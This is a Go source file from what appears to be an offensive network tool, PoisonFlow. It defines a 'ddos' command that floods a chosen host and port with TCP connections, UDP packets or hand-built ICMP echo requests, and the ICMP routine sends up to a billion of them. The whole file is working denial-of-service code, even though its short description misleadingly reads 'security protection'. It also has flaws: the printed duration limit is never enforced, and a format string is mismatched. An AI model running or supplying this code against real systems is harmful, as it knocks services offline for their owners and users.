package flow

import (
	"PoisonFlow/src/utils"
	"fmt"
	"github.com/spf13/cobra"
	"net"
	"os"
	"strconv"
	"time"
)

var (
	// DDOS 执行方法
	DDOS = &cobra.Command{
		Use:   "ddos [tab][tab]",
		Short: "安全防护",
		Long:  ``,
		Run: func(cmd *cobra.Command, args []string) {
			config := utils.Check.CheckDDos(&utils.Config)
			DDOSAPP.Execute(config)
		},
	}
	duration = 60
	count    = 1000000000
)

type ddos struct{}

func (d *ddos) Execute(config *utils.ProtoAPP) {
	switch config.Mode {
	case "TCP":
		{
			d.SYNFlood(utils.Config.Host, utils.Config.Port)
		}
	case "UDP":
		{
			d.UDPFlood(utils.Config.Host, utils.Config.Port)
		}
	case "ICMP":
		{
			d.ICMPFlood(utils.Config.Host, utils.Config.Port)
		}
	default:
		utils.Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP")
	}
}
func (d *ddos) SYNFlood(host string, port int) {
	fmt.Printf("Starting syn flood attack on %s:%s for %d seconds...\n", host, port, duration)
	for {
		_, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), time.Second*5)
		if err != nil {
			fmt.Println(err)
			continue
		}
		time.Sleep(time.Millisecond * 100)
	}
}

func (d *ddos) UDPFlood(host string, port int) {
	fmt.Printf("Starting udp flood attack on %s:%s for %d seconds...\n", host, port, duration)
	addr, err := net.ResolveUDPAddr("udp", host+":"+strconv.Itoa(port))
	utils.Check.CheckError(err)
	conn, err := net.DialUDP("udp", nil, addr)
	utils.Check.CheckError(err)
	for {
		_, err := conn.Write([]byte("Hello"))
		if err != nil {
		}

	}
}

func (d *ddos) ICMPFlood(host string, port int) {
	fmt.Printf("Starting Icmp flood attack on %s:%s for %d seconds...\n", host, port, duration)
	addr, _ := net.ResolveIPAddr("ip4", host)
	for i := 0; i < count; i++ {
		conn, err := net.DialIP("ip4:icmp", nil, addr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "DialIP failed: %s\n", err.Error())
			continue
		}

		msg := make([]byte, 48)
		msg[0] = 8       // type
		msg[1] = 0       // code
		msg[2] = 0       // checksum
		msg[3] = 0       // checksum
		msg[4] = 0       // identifier[0]
		msg[5] = 0       // identifier[1]
		msg[6] = 0       // sequence[0]
		msg[7] = byte(i) // sequence[1]

		checksum := checkSum(msg)
		msg[2] = byte(checksum >> 8)
		msg[3] = byte(checksum & 0xff)

		_, err = conn.Write(msg)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Write failed: %s\n", err.Error())
			continue
		}

		conn.Close()
	}
}

func checkSum(msg []byte) uint16 {
	sum := uint32(0)
	for i := 0; i < len(msg)-1; i += 2 {
		sum += uint32(msg[i])<<8 | uint32(msg[i+1])
	}
	if len(msg)%2 == 1 {
		sum += uint32(msg[len(msg)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum += sum >> 16
	return uint16(^sum)
}

var DDOSAPP ddos
